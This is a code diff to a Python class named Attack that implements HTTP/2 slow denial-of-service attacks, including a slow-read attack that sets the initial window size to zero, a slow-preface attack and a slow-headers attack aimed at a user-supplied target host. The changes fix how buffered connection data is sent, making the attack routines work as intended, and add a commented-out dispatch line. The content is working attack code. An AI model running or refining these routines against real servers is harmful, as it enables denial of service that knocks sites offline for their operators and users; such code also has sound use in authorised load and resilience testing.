@@ -40,7 +40,7 @@ class Attack():
         LOGGER.info("SLOW READ ATTACK================================")
         h2conn._data_to_send += CONNECTION_PREFACE
         h2conn.update_settings({SettingsFrame.INITIAL_WINDOW_SIZE: 0})
-        conn.sendall(h2conn._data_to_send())
+        conn.sendall(h2conn.data_to_send())
         headers = [
             (":authority", args.target),
             (":path", "/"),
@@ -57,7 +57,7 @@ class Attack():
         wf.window_increment = WINDOW_SIZE_INCREMENT
 
         h2conn._data_to_send += wf.serialize()
-        conn.sendall(h2conn._data_to_send())
+        conn.sendall(h2conn.data_to_send())
 
         headers = [
             (":authority", args.target),
@@ -75,7 +75,7 @@ class Attack():
 
     def slow_preface(self, conn, h2conn):
         LOGGER.info("SLOW PREFACE ATTACK=============================")
-        h2conn.sendall(h2conn.data_to_send())
+        h2conn._data_to_send += CONNECTION_PREFACE
         conn.sendall(h2conn.data_to_send())
 
     def slow_headers(self, conn, h2conn, method="GET"):
@@ -125,6 +125,8 @@ class Attack():
         
         with cons.get_lock():
             cons.value += 1
+
+        #self.ATTACKS[self.type](self.connection, self.http2_connection)
         
         try:
             self.ATTACKS[self.type](self.connection, self.http2_connection)
